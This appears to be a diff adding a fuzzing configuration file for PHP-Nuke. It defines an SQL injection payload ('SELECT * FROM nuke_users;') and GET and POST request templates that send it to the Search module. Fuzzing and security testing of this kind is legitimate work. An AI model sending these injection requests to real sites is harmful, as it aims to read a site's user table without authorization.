@@ -1,0 +1,31 @@
+# this is a fuzzing file for php-nuke.
+# test cases 1 & 2 are two attempts at sql injection using the Search module
+# make sure to set nukedir, hostname, referer, agent, 
+
+$nukedir=/
+$search_sql=SELECT * FROM nuke_users;
+
+reqwait=2000
+# 2s between each request.
+
+endcfg
+GET nukedirmodules.php?name=Search HTTP/1.0
+Host: hostname
+Content-type: application/x-www-form-urlencoded
+Content-length: %search_sql
+Referer: referer
+User-Agent: Mozilla/5.0 (compatible; Konqueror/4.1; Linux)
+
+search_sql
+
+--
+POST nukedirmodules.php?name=Search HTTP/1.0
+Host: hostname
+Content-type: application/x-www-form-urlencoded
+Content-length: %search_sql
+Referer: referer
+User-Agent: Mozilla/5.0 (compatible; Konqueror/4.1; Linux)
+
+search_sql
+
+--
